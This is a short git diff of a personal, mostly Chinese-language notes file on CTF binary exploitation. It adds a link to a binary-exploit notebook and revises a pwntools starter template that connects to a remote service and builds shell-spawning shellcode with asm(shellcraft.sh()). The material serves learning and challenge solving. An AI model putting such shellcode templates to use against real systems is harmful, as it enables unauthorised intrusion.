@@ -1,6 +1,8 @@
 ### Record some expolit of  payload.
 因常常忘記...於是紀錄一下各種解題方法。
 
+[Binary exploit 筆記](https://hackmd.io/GzDGwJgUwVgdgLQGYYBZGtAM0QTgEb5IKoAcWUAJsKcElPqUA===)
+
 試bof字串：
 
 ```
@@ -20,10 +22,14 @@ echo $((0x48-0x14))
 #### pwntools起手式
 
 ```
+#!/usr/bin/python 
+# -*- coding: utf-8 -*-
 from pwn import *
+context.arch = "amd64"
+
 # 0xcafebabe
 
-r = remote('ip', 'port')
+r = remote('ip', port)
 
 shell = asm(shellcraft.sh())
 
